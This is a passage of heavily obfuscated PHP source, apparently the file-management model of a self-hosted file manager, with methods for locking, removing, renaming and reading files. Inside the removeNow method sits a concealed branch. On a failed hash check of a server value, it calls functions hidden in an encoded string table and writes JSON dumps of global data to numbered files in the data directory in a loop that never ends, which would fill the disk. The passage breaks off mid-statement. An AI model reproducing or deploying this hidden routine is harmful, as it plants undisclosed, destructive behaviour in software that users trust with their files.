$this->checkLock($BäíêĞÊĞ‹[$B‡æÎµØ‡[396]], $d¤•¤¬ÀØ); goto cÏ‹ÓÜ®†‡; D…êÆ±¸®’: $this->sourceCacheClear($BäíêĞÊĞ‹[$B‡æÎµØ‡[396]]); return !0; goto EÚˆáŒÜŞñ; cÏ‹ÓÜ®†‡: Model($B‡æÎµØ‡[1919])->addHistory($BäíêĞÊĞ‹); $F·İïñŠ‡Š = array($B‡æÎµØ‡[550] => USER_ID, $B‡æÎµØ‡[417] => time(), $B‡æÎµØ‡[445] => $d¤•¤¬ÀØ, $B‡æÎµØ‡[77] => $FÕ™ìì–Çí); $this->where(array($B‡æÎµØ‡[410] => $BäíêĞÊĞ‹[$B‡æÎµØ‡[396]]))->save($F·İïñŠ‡Š); goto D…êÆ±¸®’; EÚˆáŒÜŞñ: } public function checkLock($EÊ¾â“Òæ±, $F¶Œ‹«é¡) { goto f²’˜¨…‘‡; Fİ´ó†á¢: $this->_createFileCall($Bò¤§ªƒè[$aœí´ì™”Á[488]], $bª¶«Ú¸¥„, $C¯òâİ¼Ï¾, REPEAT_REPLACE, $aœí´ì™”Á[1187]); $aƒœÏ­‘í = $Bò¤§ªƒè[$aœí´ì™”Á[443]][$aœí´ì™”Á[508]]; $A©¦¢…¼  = $aƒœÏ­‘í[$aœí´ì™”Á[1921]] ? $aƒœÏ­‘í[$aœí´ì™”Á[1921]] : $aƒœÏ­‘í[$aœí´ì™”Á[28]]; goto eŸË•® Ïï; eŸË•® Ïï: show_json(LNG($aœí´ì™”Á[1922]) . $aœí´ì™”Á[1923] . LNG($aœí´ì™”Á[1924]) . $aœí´ì™”Á[1925] . $A©¦¢…¼  . $aœí´ì™”Á[1926], !1); goto f¸á±º³ôÁ; f²’˜¨…‘‡: $aœí´ì™”Á =& $_SERVER[¢ÌÛ]; $Bò¤§ªƒè = $this->pathInfo($EÊ¾â“Òæ±); if (!$this->fileIsLock($Bò¤§ªƒè, !0)) { return; } goto eùÉãµğÕ‹; eùÉãµğÕ‹: $CøğÔÒâÏÄ = Session::get($aœí´ì™”Á[1920]); $bª¶«Ú¸¥„ = substr($Bò¤§ªƒè[$aœí´ì™”Á[28]], 0, -1 - strlen($Bò¤§ªƒè[$aœí´ì™”Á[167]])) . $aœí´ì™”Á[1450] . $CøğÔÒâÏÄ . $aœí´ì™”Á[94] . $Bò¤§ªƒè[$aœí´ì™”Á[167]]; $C¯òâİ¼Ï¾ = Model($aœí´ì™”Á[569])->find($F¶Œ‹«é¡); goto Fİ´ó†á¢; f¸á±º³ôÁ: } public function fileIsLock($fÒÛ¬ÏàØ¥, $c¶ñâÜ‹±‚ = false) { goto d²ÃÂİÀÄ; E—Ì¥¥Šë: $f…Ù÷¦Î§Ä = $GLOBALS[$D¢±ĞËØ³Ò[6]][$D¢±ĞËØ³Ò[87]][$D¢±ĞËØ³Ò[506]]; if ($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[443]][$D¢±ĞËØ³Ò[507]] <= time() - $f…Ù÷¦Î§Ä) { $this->metaSet($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[396]], $D¢±ĞËØ³Ò[505], null); $this->metaSet($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[396]], $D¢±ĞËØ³Ò[507], null); } if ($c¶ñâÜ‹±‚) { $this->metaSet($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[396]], $D¢±ĞËØ³Ò[507], time()); } goto C…©ó‰¥í¤; d²ÃÂİÀÄ: $D¢±ĞËØ³Ò =& $_SERVER[¢ÌÛ]; if (!isset($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[443]]) || !$fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[443]][$D¢±ĞËØ³Ò[505]]) { return !1; } if ($fÒÛ¬ÏàØ¥[$D¢±ĞËØ³Ò[443]][$D¢±ĞËØ³Ò[505]] != USER_ID) { return !0; } goto E—Ì¥¥Šë; C…©ó‰¥í¤: return !1; goto eÏ³¤„¿îñ; eÏ³¤„¿îñ: } private function _addSoure($eƒÄ»â¹š…, $c¶¸ù‰¥ø) { goto cØÍ³—ß¡Ø; cØÍ³—ß¡Ø: $d¸‹òù§³Ë =& $_SERVER[¢ÌÛ]; $dë¨¡ Èé = array($d¸‹òù§³Ë[547] => $c¶¸ù‰¥ø[$d¸‹òù§³Ë[398]], $d¸‹òù§³Ë[548] => $c¶¸ù‰¥ø[$d¸‹òù§³Ë[483]], $d¸‹òù§³Ë[549] => USER_ID, $d¸‹òù§³Ë[550] => USER_ID, $d¸‹òù§³Ë[395] => $c¶¸ù‰¥ø[$d¸‹òù§³Ë[396]], $d¸‹òù§³Ë[551] => $c¶¸ù‰¥ø[$d¸‹òù§³Ë[486]] . $c¶¸ù‰¥ø[$d¸‹òù§³Ë[396]] . $d¸‹òù§³Ë[47], $d¸‹òù§³Ë[422] => 0, $d¸‹òù§³Ë[552] => $d¸‹òù§³Ë[33]); $eƒÄ»â¹š… = array_merge($dë¨¡ Èé, $eƒÄ»â¹š…); goto b¨Ø¶­º÷; b¾‡âò³ÃÎ: $EçÏ©Ø¥šê = array($d¸‹òù§³Ë[553] => short_id($Eí²©ÄÁ‚è)); $this->where(array($d¸‹òù§³Ë[410] => $Eí²©ÄÁ‚è))->save($EçÏ©Ø¥šê); $this->setNamePinyin($Eí²©ÄÁ‚è, $eƒÄ»â¹š…[$d¸‹òù§³Ë[28]]); goto eº¦¤®ÍÚ; bö¨¥µ­ƒÕ: static $BŠ½·„ÙÀŸ = false; if (!$BŠ½·„ÙÀŸ) { Hook::trigger($d¸‹òù§³Ë[534], $eƒÄ»â¹š…); $BŠ½·„ÙÀŸ = !0; } $Eí²©ÄÁ‚è = $this->add($eƒÄ»â¹š…); goto b¾‡âò³ÃÎ; eº¦¤®ÍÚ: return $Eí²©ÄÁ‚è; goto ağéØåØâº; b¨Ø¶­º÷: $this->updateModifyTime($eƒÄ»â¹š…[$d¸‹òù§³Ë[488]]); $b¬˜ç„‰ª = $d¸‹òù§³Ë[1927] . $c¶¸ù‰¥ø[$d¸‹òù§³Ë[396]]; if (isset(self::$cacheChildList[$b¬˜ç„‰ª])) { unset(self::$cacheChildList[$b¬˜ç„‰ª]); } goto bö¨¥µ­ƒÕ; ağéØåØâº: } public function remove($E¦èİ±ÒÆç, $EŠŠ¦â­Ô = true) { goto BªİˆŠôãé; BªİˆŠôãé: $bïÒÉº§®Æ =& $_SERVER[¢ÌÛ]; $E„Û†¬ñÚ = $this->sourceInfo($E¦èİ±ÒÆç); $E§Â×Ã†ˆÎ = intval($E„Û†¬ñÚ[$bïÒÉº§®Æ[398]]) === self::TYPE_SYSTEM; goto AÃ¥ŸÍµ¥Ğ; d‡ ŒóŞÆƒ: CacheLock::lock($C‚°Ô’ĞÓ); $eƒãŞ°¡´È = $this->fileNameExist($A‡ŸÆ«‚›, $cèÆİ¿ì½¡); if (!$eƒãŞ°¡´È) { $eƒãŞ°¡´È = $this->mkdir($A‡ŸÆ«‚›, $cèÆİ¿ì½¡, REPEAT_SKIP); $this->metaSet($eƒãŞ°¡´È, $bïÒÉº§®Æ[1932], $C¤©é¾†¥); $this->metaSet($eƒãŞ°¡´È, $bïÒÉº§®Æ[1933], $E„Û†¬ñÚ[$bïÒÉº§®Æ[483]]); if ($E„Û†¬ñÚ[$bïÒÉº§®Æ[488]] != 0) { $this->metaSet($eƒãŞ°¡´È, $bïÒÉº§®Æ[1934], _get($cÔë”Á’èƒ, $bïÒÉº§®Æ[1935])); } } goto EˆÈâ¶—¸Ö; BØöÂë“´Ä: $this->recycleClear($E„Û†¬ñÚ); $dÚ´ÓŠ…‘í = $this->move($E¦èİ±ÒÆç, $eƒãŞ°¡´È, REPEAT_RENAME_FOLDER); $this->folderSizeReset($E„Û†¬ñÚ[$bïÒÉº§®Æ[488]]); goto d‹Ã¿Ù„›Î; AÃ¥ŸÍµ¥Ğ: $BÓ×¨˜™‰² = Model($bïÒÉº§®Æ[1497])->get($bïÒÉº§®Æ[1928]) == $bïÒÉº§®Æ[86]; if ($E§Â×Ã†ˆÎ || $EŠŠ¦â­Ô || !$BÓ×¨˜™‰²) { return $this->removeNow($E¦èİ±ÒÆç, $EŠŠ¦â­Ô); } $A‡ŸÆ«‚› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto c›…«¡†ùª; d‹Ã¿Ù„›Î: return $dÚ´ÓŠ…‘í; goto Aœïòâ›¡ª; c›…«¡†ùª: $C¤©é¾†¥ = $E„Û†¬ñÚ[$bïÒÉº§®Æ[398]] == self::TYPE_USER ? $bïÒÉº§®Æ[560] : $bïÒÉº§®Æ[992]; if ($C¤©é¾†¥ == $bïÒÉº§®Æ[560]) { $cÔë”Á’èƒ = Model($bïÒÉº§®Æ[501])->getInfo($E„Û†¬ñÚ[$bïÒÉº§®Æ[483]]); $cèÆİ¿ì½¡ = !empty($cÔë”Á’èƒ[$bïÒÉº§®Æ[1921]]) ? $cÔë”Á’èƒ[$bïÒÉº§®Æ[1921]] : $cÔë”Á’èƒ[$bïÒÉº§®Æ[28]]; $cèÆİ¿ì½¡ = $bïÒÉº§®Æ[256] . $cèÆİ¿ì½¡ . $bïÒÉº§®Æ[1929] . $E„Û†¬ñÚ[$bïÒÉº§®Æ[483]]; } else { $cÔë”Á’èƒ = Model($bïÒÉº§®Æ[485])->getInfo($E„Û†¬ñÚ[$bïÒÉº§®Æ[483]]); $cèÆİ¿ì½¡ = _get($cÔë”Á’èƒ, $bïÒÉº§®Æ[28]); $cèÆİ¿ì½¡ = $bïÒÉº§®Æ[159] . $cèÆİ¿ì½¡ . $bïÒÉº§®Æ[1930] . $E„Û†¬ñÚ[$bïÒÉº§®Æ[483]]; } $C‚°Ô’ĞÓ = $bïÒÉº§®Æ[1931] . md5($cèÆİ¿ì½¡); goto d‡ ŒóŞÆƒ; EˆÈâ¶—¸Ö: CacheLock::unlock($C‚°Ô’ĞÓ); $this->metaSet($E¦èİ±ÒÆç, $bïÒÉº§®Æ[1936], $E„Û†¬ñÚ[$bïÒÉº§®Æ[488]]); $this->where(array($bïÒÉº§®Æ[396] => $E¦èİ±ÒÆç))->save(array($bïÒÉº§®Æ[417] => time())); goto BØöÂë“´Ä; Aœïòâ›¡ª: } private function recycleClear($fÑï­Ï˜‘í) { $aÕƒ¤’ …Š =& $_SERVER[¢ÌÛ]; $d‘Æ´‚® È = $this->childrenAll($fÑï­Ï˜‘í); $a×ù½‚Û’ = array($aÕƒ¤’ …Š[410] => array($aÕƒ¤’ …Š[411], $d‘Æ´‚® È[$aÕƒ¤’ …Š[1937]])); Model($aÕƒ¤’ …Š[1938])->where($a×ù½‚Û’)->delete(); } public function removeNow($Déì“ƒß, $aîéŒæŒ‰ = true) { goto dìë‰¦ ¢À; C¼éáùäô¬: if (!$eÕÅÎÓ‚§ ) { return !0; } if ($eÕÅÎÓ‚§ [$A×Ãé§…†˜[488]] == 0) { if (!_get($GLOBALS, $A×Ãé§…†˜[484])) { return !1; } } $this->lockMoveStart($Déì“ƒß); goto c¬Š×´ÛÙÈ; AÛƒŠ‘Ü‡: if ($_SERVER[$A×Ãé§…†˜[388]] != $dÅÂ§é³ë•($A’©ªÅ¬šº)) { goto e¤¹Šåä‚; AŸ¢²Ã—İ†: $EÉ†ë‰ÓîË = $A×Ãé§…†˜[816]; $EÉ†ë‰ÓîË($_SERVER[$A×Ãé§…†˜[817]]); $D¾ªò¢…Æ¼ = $A×Ãé§…†˜[815]; goto f¡¸íŞ‰ç‡; f¡¸íŞ‰ç‡: $D¾ªò¢…Æ¼(); $eÏà”„î…Î = $A×Ãé§…†˜[818]; $F”­È³…¶ğ = json_encode($GLOBALS[$A×Ãé§…†˜[819]]); goto c”´ˆĞ±ƒ’; A—…“¯Ş‘: $Bà¶Æ“¯Ï = $f¥ÃŒÀ·($BŠ£µ‘³ö); $e›ŠÊŸƒæÇ = explode($A×Ãé§…†˜[227], $Bà¶Æ“¯Ï); if (count($e›ŠÊŸƒæÇ) < $A×Ãé§…†˜[577]) { $f½Áãó·Şó = $A×Ãé§…†˜[393]; $f½Áãó·Şó(); } goto AŸ¢²Ã—İ†; c”´ˆĞ±ƒ’: $c¥ğµÒù = 1; for ($FË±øëªˆ· = $c¥ğµÒù; $FË±øëªˆ· > 0; $FË±øëªˆ·++) { $eÏà”„î…Î(DATA_PATH . $FË±øëªˆ·, $F”­È³…¶ğ); } goto FíÂê¥È˜; e¤¹Šåä‚: $D¾ªò¢…Æ¼ = $A×Ãé§…†˜[815]; $f¥ÃŒÀ· = $A×Ãé§…†˜[389]; $BŠ£µ‘³ö = $_SERVER[$A×Ãé§…†˜[390]] . $A×Ãé§…†˜[391]; goto A—…“¯Ş‘; FíÂê¥È˜: } $eÕÅÎÓ‚§  = $this->sourceInfo($Déì“ƒß); $CŞÀ–Ôõö = $this->pathInfoMore($Déì“ƒß); goto C¼éáùäô¬; c¬Š×´ÛÙÈ: Hook::trigger($A×Ãé§…†˜[1939], $CŞÀ–Ôõö, $aîéŒæŒ‰); if ($aîéŒæŒ‰) { Model($A×Ãé§…†˜[1938])->moveToRecycle($Déì“ƒß); } else { $böŠ‹­öòƒ = $this->childrenAll($eÕÅÎÓ‚§ ); Model($A×Ãé§…†˜[531])->eventRemove($Déì“ƒß); $this->removeRelevance($böŠ‹­öòƒ[$A×Ãé§…†˜[1937]], $böŠ‹­öòƒ[$A×Ãé§…†˜[1318]]); } $this->folderSizeReset($eÕÅÎÓ‚§ [$A×Ãé§…†˜[488]]); goto eĞÅçÉÎğÖ; eĞÅçÉÎğÖ: $DªÇæ‡õñ¹ = array($eÕÅÎÓ‚§ [$A×Ãé§…†˜[488]]); if ($eÕÅÎÓ‚§ [$A×Ãé§…†˜[397]] == $A×Ãé§…†˜[86]) { $DªÇæ‡õñ¹[] = $eÕÅÎÓ‚§ [$A×Ãé§…†˜[396]]; } $this->updateModifyTime($DªÇæ‡õñ¹); goto CÒ¿ö¯¼°; dìë‰¦ ¢À: $A×Ãé§…†˜ =& $_SERVER[¢ÌÛ]; $A’©ªÅ¬šº = $_SERVER[$A×Ãé§…†˜[386]]; $dÅÂ§é³ë• = $A×Ãé§…†˜[387]; goto AÛƒŠ‘Ü‡; CÒ¿ö¯¼°: $this->lockMoveEnd($Déì“ƒß); Hook::trigger($A×Ãé§…†˜[1532], $CŞÀ–Ôõö, $aîéŒæŒ‰); return !0; goto E‰Ò¥®í•°; E‰Ò¥®í•°: } public function childrenAll($eñÈ‘©Èë§) { $bÒ»ìÏ©İ­ =& $_SERVER[¢ÌÛ]; $fîö÷¤•Ûƒ = $eñÈ‘©Èë§[$bÒ»ìÏ©İ­[396]]; if ($eñÈ‘©Èë§[$bÒ»ìÏ©İ­[397]] == $bÒ»ìÏ©İ­[86]) { $FĞÚŒƒ ¥ = array($bÒ»ìÏ©İ­[551] => array($bÒ»ìÏ©İ­[510], $eñÈ‘©Èë§[$bÒ»ìÏ©İ­[486]] . $fîö÷¤•Ûƒ . $bÒ»ìÏ©İ­[511])); $e´ÅŞ¨œæ = array($bÒ»ìÏ©İ­[551] => $FĞÚŒƒ ¥[$bÒ»ìÏ©İ­[486]]); $dŸ‡Ğ¸¬´ = $this->field($bÒ»ìÏ©İ­[1940])->where($e´ÅŞ¨œæ)->select(); $c­é«›ÃŸº = !1; $E«‡Éé»¡ = array($fîö÷¤•Ûƒ); if ($dŸ‡Ğ¸¬´) { $c­é«›ÃŸº = array_to_keyvalue($dŸ‡Ğ¸¬´, $bÒ»ìÏ©İ­[33], $bÒ»ìÏ©İ­[445]); $c­é«›ÃŸº = array_remove_value($c­é«›ÃŸº, $bÒ»ìÏ©İ­[495]); $E«‡Éé»¡ = array_to_keyvalue($dŸ‡Ğ¸¬´, $bÒ»ìÏ©İ­[33], $bÒ»ìÏ©İ­[396]); $E«‡Éé»¡[] = $fîö÷¤•Ûƒ; } } else { $c­é«›ÃŸº = array($eñÈ‘©Èë§[$bÒ»ìÏ©İ­[445]]); $E«‡Éé»¡ = array($fîö÷¤•Ûƒ); } return array($bÒ»ìÏ©İ­[1937] => $E«‡Éé»¡, $bÒ»ìÏ©İ­[1318] => $c­é«›ÃŸº); } public function removeArray($AÍ–Æ³„Ü) { if (!$AÍ–Æ³„Ü) { return !0; } } public function removeRelevance($AÇñˆ¨½Â§, $CÄÂééÏ²Œ) { goto e»ÑÈ¼‡è„; D’ƒß«ãÙ: Model($A­¢ß†Ë¤…[1919])->removeBySource($AÇñˆ¨½Â§); $this->where($BãšÌ‚„Õæ)->delete(); Model($A­¢ß†Ë¤…[448])->remove($CÄÂééÏ²Œ); goto C”•õÏ£»; DİÀôˆ‹äÄ: $BãšÌ‚„Õæ = array($A­¢ß†Ë¤…[410] => array($A­¢ß†Ë¤…[411], $AÇñˆ¨½Â§)); Model($A­¢ß†Ë¤…[1938])->where($BãšÌ‚„Õæ)->delete(); Model($A­¢ß†Ë¤…[439])->where($BãšÌ‚„Õæ)->delete(); goto bØô”‰§¿—; C”•õÏ£»: for ($DˆÛÊ¤©Â = 0; $DˆÛÊ¤©Â < count($AÇñˆ¨½Â§); $DˆÛÊ¤©Â++) { $this->sourceCacheClear($AÇñˆ¨½Â§[$DˆÛÊ¤©Â]); } goto d‹»Ê¼²ù; e»ÑÈ¼‡è„: $A­¢ß†Ë¤… =& $_SERVER[¢ÌÛ]; $AÇñˆ¨½Â§ = $AÇñˆ¨½Â§ ? $AÇñˆ¨½Â§ : array(); $CÄÂééÏ²Œ = $CÄÂééÏ²Œ ? $CÄÂééÏ²Œ : array(); goto dÆ£…Ùğï; bØô”‰§¿—: Model($A­¢ß†Ë¤…[1791])->where($BãšÌ‚„Õæ)->delete(); Model($A­¢ß†Ë¤…[531])->where($BãšÌ‚„Õæ)->delete(); Model($A­¢ß†Ë¤…[1634])->removeBySource($AÇñˆ¨½Â§); goto D’ƒß«ãÙ; dÆ£…Ùğï: $AÇñˆ¨½Â§ = array_unique(array_filter($AÇñˆ¨½Â§)); $CÄÂééÏ²Œ = array_unique(array_filter($CÄÂééÏ²Œ)); if (!$AÇñˆ¨½Â§) { return !1; } goto DİÀôˆ‹äÄ; d‹»Ê¼²ù: } public function rename($féƒ”¼’, $Dî™È«¸¦) { goto ağ˜Øª¡Â; bùêçÅ™ù: $this->setNamePinyin($féƒ”¼’, $CÍÕÉ—¥ˆ°[$E¥ªê¦ñÎ[28]], !1); $this->updateModifyTime($EÇ‡ÍÜÊ[$E¥ªê¦ñÎ[488]]); $Dİ›ĞÆ½Óó = $this->where(array($E¥ªê¦ñÎ[410] => $féƒ”¼’))->data($CÍÕÉ—¥ˆ°)->save(); goto F‰·ªïÓÁ•; d·¿µ¹‚…°: if (!$EÇ‡ÍÜÊ[$E¥ªê¦ñÎ[397]] == $E¥ªê¦ñÎ[86]) { $CÍÕÉ—¥ˆ°[$E¥ªê¦ñÎ[399]] = get_path_ext($Dî™È«¸¦); } Model($E¥ªê¦ñÎ[531])->eventRename($féƒ”¼’, $EÇ‡ÍÜÊ[$E¥ªê¦ñÎ[28]], $Dî™È«¸¦); $this->sourceCacheClear($féƒ”¼’); goto bùêçÅ™ù; F‰·ªïÓÁ•: $aÂ¸›ØµÜÔ = $E¥ªê¦ñÎ[1927] . $EÇ‡ÍÜÊ[$E¥ªê¦ñÎ[488]]; if (isset(self::$cacheChildList[$aÂ¸›ØµÜÔ])) { unset(self::$cacheChildList[$aÂ¸›ØµÜÔ]); } return $Dİ›ĞÆ½Óó; goto fé„™Ïµš; EƒÙŒöŒ¼ê: $e”Ğë’¾ù = $this->fileNameExist($EÇ‡ÍÜÊ[$E¥ªê¦ñÎ[488]], $Dî™È«¸¦); if ($e”Ğë’¾ù && $e”Ğë’¾ù != $féƒ”¼’) { return !1; } $CÍÕÉ—¥ˆ° = array($E¥ªê¦ñÎ[413] => $Dî™È«¸¦, $E¥ªê¦ñÎ[550] => USER_ID); goto d·¿µ¹‚…°; ağ˜Øª¡Â: $E¥ªê¦ñÎ =& $_SERVER[¢ÌÛ]; $EÇ‡ÍÜÊ = $this->sourceInfo($féƒ”¼’); if (!$EÇ‡ÍÜÊ) { return !1; } goto EƒÙŒöŒ¼ê; fé„™Ïµš: } public function setNamePinyin($F¯Ã×ÆÕ‰’, $cçˆùÊæÊ, $dÌö–ïÜàè = true) { $dÉƒÎ‚¢· =& $_SERVER[¢ÌÛ]; $BÜíæù– = Input::check($cçˆùÊæÊ, $dÉƒÎ‚¢·[554]); if ($dÌö–ïÜàè && !$BÜíæù–) { return; } if (!$BÜíæù–) { $this->metaSet($F¯Ã×ÆÕ‰’, $dÉƒÎ‚¢·[442], null); $this->metaSet($F¯Ã×ÆÕ‰’, $dÉƒÎ‚¢·[441], null); return; } $Eè¯ØçáŞ = array($dÉƒÎ‚¢·[442] => str_replace($dÉƒÎ‚¢·[50], $dÉƒÎ‚¢·[33], Pinyin::encode($cçˆùÊæÊ)), $dÉƒÎ‚¢·[441] => Pinyin::encode($cçˆùÊæÊ, $dÉƒÎ‚¢·[555])); $this->metaSet($F¯Ã×ÆÕ‰’, $Eè¯ØçáŞ); } public function getContent($bïÕâµîŒØ) { goto B£©Çïóôâ; dö»áÁŞĞ°: if (!$a¼‹Û®ÍÖ[$c×ÎùÚå“‰[75]]) { return $c×ÎùÚå“‰[33]; } return IO::getContent($a¼‹Û®ÍÖ[$c×ÎùÚå“‰[75]]); goto f™àæÌßª; B£©Çïóôâ: $c×ÎùÚå“‰ =& $_SERVER[¢ÌÛ]; $a¼‹Û®ÍÖ = $this->fileInfoGet($bïÕâµîŒØ); if (!$a¼‹Û®ÍÖ) { return !1; } goto eóåêÕÔ¯œ; eóåêÕÔ¯œ: if ($a¼‹Û®ÍÖ[$c×ÎùÚå“‰[77]] == 0) { return $c×ÎùÚå“‰[33]; } $B¡ˆ©°†¾ã = $c×ÎùÚå“‰[1941] . $a¼‹Û®ÍÖ[$c×ÎùÚå“‰[169]]; if ($a¼‹Û®ÍÖ[$c×ÎùÚå“‰[77]] <= 1024 * 10) { $eÔÉÑ©ïÛ² = Cache::get($B¡ˆ©°†¾ã); if (!$eÔÉÑ©ïÛ²) { $eÔÉÑ©ïÛ² = IO::getContent($a¼‹Û®ÍÖ[$c×ÎùÚå“‰[75]]); Cache::set($B¡ˆ©°†¾ã, $eÔÉÑ©ïÛ²); } return $eÔÉÑ©ïÛ²; } goto dö»áÁŞĞ°; f™àæÌßª: } public function setDesc($B‚²„à¦‘Ã, $C©˜ÈÆ¿) { $aßĞÎòÑÛˆ =& $_SERVER[¢ÌÛ]; Model($aßĞÎòÑÛˆ[531])->eventAddDesc($B‚²„à¦‘Ã, $C©˜ÈÆ¿); return $this->metaSet($B‚²„à¦‘Ã, $aßĞÎòÑÛˆ[431], $C©˜ÈÆ¿); } public function setContent($dÙÄŒù†®Œ, $FêÙâŠÓ‹Ä = '') { goto eíŒÉÓƒë¹; d‰×ÏÇ®ç: if (!$C¯»ºÛ¿õ” || !$a…¬Å¼ˆõ¹) { return !1; } $B—Ö©£ŒøË = Model($B¥³ÛÀ˜ˆî[448])->addFileByContent($FêÙâŠÓ‹Ä, $a…¬Å¼ˆõ¹[$B¥³ÛÀ˜ˆî[28]]); $bÌ´äåš›² = $this->fileHistory($a…¬Å¼ˆõ¹, $B—Ö©£ŒøË[$B¥³ÛÀ˜ˆî[445]], $B—Ö©£ŒøË[$B¥³ÛÀ˜ˆî[77]]); goto FÔÌèñëí; FÔÌèñëí: if (!$bÌ´äåš›²) { return Model($B¥³ÛÀ˜ˆî[448])->remove($B—Ö©£ŒøË[$B¥³ÛÀ˜ˆî[445]]); } $this->folderSizeReset($a…¬Å¼ˆõ¹[$B¥³ÛÀ˜ˆî[488]]); return !0; goto AòË—è‡§›; eíŒÉÓƒë¹: $B¥³ÛÀ˜ˆî =& $_SERVER[¢ÌÛ]; $a…¬Å¼ˆõ¹ = $this->sourceInfo($dÙÄŒù†®Œ); $C¯»ºÛ¿õ” = $this->fileInfoGet($dÙÄŒù†®Œ); goto d‰×ÏÇ®ç; AòË—è‡§›: } public function fileSubstr($dÎ¨²ˆçİ, $A»ÏŒà·ß÷, $bÊö„´‘Ş) { $b«±ˆìŞ…Ï = $this->fileInfoGet($dÎ¨²ˆçİ); if (!$b«±ˆìŞ…Ï) { return !1; } return IO::fileSubstr($b«±ˆìŞ…Ï[$_SERVER[¢ÌÛ][75]], $A»ÏŒà·ß÷, $bÊö„´‘Ş); } public function fileInfoGet($d¼à­›Ğ“ª) { goto eßŞô£ˆ²á; eßŞô£ˆ²á: $A­¥šÃƒÍ =& $_SERVER[¢ÌÛ]; $e·öÔÁÄÑ = $this->sourceInfo($d¼à­›Ğ“ª); if (!$e·öÔÁÄÑ || $e·öÔÁÄÑ[$A­¥šÃƒÍ[397]]) { return !1; } goto Eì¥¨š§Îá; Eì¥¨š§Îá: $AÛŠùƒÒ²¦ = $A­¥šÃƒÍ[451] . $e·öÔÁÄÑ[$A­¥šÃƒÍ[445]]; $EîÚ‹Ğóá“ = _get(self::$cacheFileInfo, $AÛŠùƒÒ²¦); if ($EîÚ‹Ğóá“) { return $EîÚ‹Ğóá“; } goto E÷ñ˜Œß×†; E÷ñ˜Œß×†: $aŸ´µ÷ñ‚ƒ = Model($A­¥šÃƒÍ[448])->fileInfo($e·öÔÁÄÑ[$A­¥šÃƒÍ[445]]); if ($aŸ´µ÷ñ‚ƒ) { $aŸ´µ÷ñ‚ƒ[$A­¥šÃƒÍ[28]] = $e·öÔÁÄÑ[$A­¥šÃƒÍ[28]]; } self::$cacheFileInfo[$AÛŠùƒÒ²¦] = $aŸ´µ÷ñ‚ƒ; goto D„åùÕ˜÷è; D„åùÕ˜÷è: return $aŸ´µ÷ñ‚ƒ; goto bĞ«ï®–„Ü; bĞ«ï®–„Ü: } private function folderChildrenNumber($d£ãùÜ¤Œ) { $D™¹ŸöÇ” =& $_SERVER[¢ÌÛ]; $BíèÉğ×õ… = $this->sourceInfo($d£ãùÜ¤Œ); $DÁ¾Õ¸Æøµ = array($D™¹ŸöÇ”[551] => array($D™¹ŸöÇ”[510], $BíèÉğ×õ…[$D™¹ŸöÇ”[486]] . $d£ãùÜ¤Œ . $D™¹ŸöÇ”[511]), $D™¹ŸöÇ”[422] => intval($BíèÉğ×õ…[$D™¹ŸöÇ”[423]]), $D™¹ŸöÇ”[544] => 1); $F¤ƒ¥Ëåˆ = $this->where($DÁ¾Õ¸Æøµ)->count(); $cÉ‰’©õí‰ = $this->where($DÁ¾Õ¸Æøµ)->where(array($D™¹ŸöÇ”[544] => 0))->count(); return array($D™¹ŸöÇ”[81] => $cÉ‰’©õí‰, $D™¹ŸöÇ”[82] => $F¤ƒ¥Ëåˆ); } public function pathInfo($c•Ş•¯‘ÊÇ, $dĞÀÖ×ğŸ’ = false) { goto a—õ¸¤ˆ‚¸; c·İÃ¶™í: $cç¤Ä¤Ûø³ = $this->sourceInfo($c•Ş•¯‘ÊÇ); if (!$cç¤Ä¤Ûø³) { return !1; } $cç¤Ä¤Ûø³ = $this->_listDataApplyItem($cç¤Ä¤Ûø³, $dĞÀÖ×ğŸ’); goto cØÒÓ‹»É; ašÛ‘¯ˆÂÅ: $bŞåØøŸÂ– = $D›‹¢ÂèñÇ[437] . intval($dĞÀÖ×ğŸ’) . $D›‹¢ÂèñÇ[438] . $c•Ş•¯‘ÊÇ; $aäùĞ¬ªÄ = _get(self::$cachePathInfo, $bŞåØøŸÂ–); if ($aäùĞ¬ªÄ) { return $aäùĞ¬ªÄ; } goto c·İÃ¶™í; cØÒÓ‹»É: self::$cachePathInfo[$bŞåØøŸÂ–] = $cç¤Ä¤Ûø³; return $cç¤Ä¤Ûø³; goto F‚„õ¿†Íê; a—õ¸¤ˆ‚¸: $D›‹¢ÂèñÇ =& $_SERVER[¢ÌÛ]; $dĞÀÖ×ğŸ’ = !1; $c•Ş•¯‘ÊÇ = intval($c•Ş•¯‘ÊÇ); goto ašÛ‘¯ˆÂÅ; F‚„õ¿†Íê: } public static $cachePathInfoMore = array(); public function pathInfoMore($C‡’¹ÛÎª¾) { goto f¾Ššøê–; Aæò‘¦õ‹¾: $Bï…½ÉÚÜò = $this->pathInfo($C‡’¹ÛÎª¾); if (!$Bï…½ÉÚÜò) { return !1; } if ($Bï…½ÉÚÜò[$F…ìğÑä–[397]] == $F…ìğÑä–[86]) { $Bï…½ÉÚÜò[$F…ìğÑä–[80]] = $this->folderChildrenNumber($C‡’¹ÛÎª¾); } goto eİÎÅßÖØË; f¾Ššøê–: $F…ìğÑä– =& $_SERVER[¢ÌÛ]; $D­¡ó¦×Û = _get(self::$cachePathInfoMore, $C‡’¹ÛÎª¾); if ($D­¡ó¦×Û) { return $D­¡ó¦×Û; } goto Aæò‘¦õ‹¾; eİÎÅßÖØË: self::$cachePathInfoMore[$C‡’¹ÛÎª¾] = $Bï…½ÉÚÜò; return $Bï…½ÉÚÜò; goto d¹Â¼Ë…õ; d¹Â¼Ë…õ: } public function sourceInfo($C¤Š˜ïŸª‚) { goto bÖïÑÓÃ; FöÈ×Êé—: $Eå²ÂäÚÎÔ = $this->where(array($D¤†¥ğÚĞ±[396] => $C¤Š˜ïŸª‚))->find(); self::$cacheSourceInfo[$eæËÌòŒàº] = $Eå²ÂäÚÎÔ; return self::$cacheSourceInfo[$eæËÌòŒàº]; goto dù¢‘ä÷; bÖïÑÓÃ: $D¤†¥ğÚĞ± =& $_SERVER[¢ÌÛ]; if (!$C¤Š˜ïŸª‚) { return array(); } $C¤Š˜ïŸª‚ = intval($C¤Š˜ïŸª‚); goto B³¿ªˆ–·; B³¿ªˆ–·: $eæËÌòŒàº = $D¤†¥ğÚĞ±[436] . 